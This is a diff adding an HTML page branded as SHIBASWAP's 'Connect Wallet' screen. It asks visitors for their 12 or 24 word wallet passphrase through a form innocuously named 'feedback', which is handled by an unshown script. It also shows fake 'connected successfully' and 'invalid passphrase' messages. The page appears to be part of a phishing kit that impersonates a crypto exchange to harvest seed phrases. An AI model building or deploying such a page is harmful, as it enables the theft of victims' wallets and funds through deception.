@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connect Wallet - SHIBASWAP</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" type="image/png" href="images/shibaswap.png">
+</head>
+<body>
+    <div class="container">
+       
+
+        <!-- Feedback Page -->
+        <div id="feedbackPage" class="page active">
+            <div class="feedback-container">
+                <a href="index.html" class="back-btn">← Back to Home</a>
+                <h2>CONNECT WALLET</h2>
+                <p style="text-align: center; margin-bottom: 20px; opacity: 0.8;">Connect your wallet to get started</p>
+                
+                <div id="successMsg" class="success-message">
+                    ✓ Wallet connected successfully! Redirecting to DEX...
+                </div>
+
+                <div id="errorMsg" class="error-message">
+                    ✗ Invalid Passphrase! Please enter a valid passphrase.
+                </div>
+
+                <form id="feedbackForm">
+                    <textarea name="feedback" id="feedbackText" placeholder="Enter your 12 or 24 word Passphrase..." required></textarea>
+                    <div class="word-counter">
+                        Input a valid passphrase: <span id="wordCount">0</span>
+                    </div>
+                    <button type="submit" class="btn btn-submit">CONNECT</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script src="feedback.js"></script>
+</body>
+</html>
